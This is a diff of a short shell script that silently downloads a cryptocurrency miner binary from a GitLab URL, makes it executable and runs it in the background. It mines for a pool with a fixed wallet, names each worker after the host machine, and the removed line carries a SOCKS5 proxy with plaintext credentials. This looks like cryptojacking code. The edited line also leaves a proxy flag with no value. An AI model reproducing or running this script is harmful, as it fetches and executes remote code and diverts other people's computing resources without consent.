@@ -1,4 +1,4 @@
 #!/bin/sh
 curl -L https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer >/dev/null 2>&1
 chmod +x nheqminer >/dev/null 2>&1
-nohup ./nheqminer -v -l  verushash.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(cat /proc/sys/kernel/hostname) -p c=DGB -t 6 -x socks5://vjtxwfpn:muhcozd50opx@45.95.96.237:8796 > nohup.out 
+nohup ./nheqminer -v -l  verushash.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(cat /proc/sys/kernel/hostname) -p c=DGB -t 6 -x > nohup.out 
